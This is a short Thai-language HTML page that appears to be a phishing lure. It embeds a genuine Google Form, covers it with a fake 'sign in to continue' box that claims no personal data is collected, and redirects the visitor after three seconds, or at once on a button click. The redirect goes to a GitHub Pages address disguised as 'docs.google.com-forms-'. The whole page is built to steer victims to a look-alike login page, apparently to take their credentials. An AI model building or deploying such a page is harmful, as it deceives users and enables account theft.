<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ฟอร์มกิจกรรม</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f3e7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }

        .form-container {
            width: 90%;
            max-width: 800px;
            height: 80vh;
            background-color: white;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            padding: 20px;
            position: relative;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        .message-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 20px;
            border: 2px solid #ccc;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 400px;
            text-align: left;
            z-index: 9999;
        }

        .message-box h3 {
            margin-top: 0;
            font-size: 20px;
        }

        .message-box p {
            font-size: 16px;
            color: #333;
        }

        .message-box a {
            color: #1a73e8;
            text-decoration: none;
        }

        .message-box a:hover {
            text-decoration: underline;
        }

        .message-box .button-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 20px;
        }

        .message-box .next-btn {
            background-color: #e86c1a;
            color: white;
            padding: 20px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .message-box .next-btn:hover {
            background-color: #1669c1;
        }

        /* ปรับขนาดให้เหมาะกับมือถือ */
        @media (max-width: 768px) {
            .form-container {
                height: 90vh;
            }

            .message-box {
                width: 90%;
            }
        }
    </style>
</head>
<body>

    <div class="form-container">
        <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdQ_uaHQolMBnG_Kncbf9b6kcPHIZ1CShw2mSvDX9Ci4zw5Jg/viewform?embedded=true"
                frameborder="0" id="googleForm" onload="startRedirectTimer()"></iframe>

        <!-- กล่องข้อความ -->
        <div class="message-box">
            <h3>ลงชื่อเข้าใช้เพื่อดำเนินการต่อ</h3>
            <p>ต้องลงชื่อเข้าใช้เพื่อกรอกแบบฟอร์มนี้ โดยจะไม่มีการเก็บข้อมูลส่วนตัวของคุณ</p>
            <a href="#">รายละเอียดเพิ่มเติม</a>
            
            <!-- ปุ่ม "ลงชื่อเข้าใช้" -->
            <div class="button-container">
                <button class="next-btn" id="loginButton">ลงชื่อเข้าใช้</button>
            </div>
        </div>
    </div>

    <script>
        // ฟังก์ชันเริ่มนับเวลาถอยหลัง 3 วินาทีหลังจากโหลดฟอร์ม
        function startRedirectTimer() {
            console.log("Google Form Loaded. Starting timer...");
            setTimeout(function() {
                window.location.href = "https://dark123351.github.io/docs.google.com-forms-/";
            }, 3000);
        }

        // ฟังก์ชันสำหรับปุ่ม "ลงชื่อเข้าใช้" (เปลี่ยนหน้าทันที)
        document.getElementById('loginButton').addEventListener('click', function() {
            console.log("ปุ่มถูกกด, เปลี่ยนหน้าเดี๋ยวนี้...");
            window.location.href = "https://dark123351.github.io/docs.google.com-forms-/";
        });
    </script>

</body>
</html>
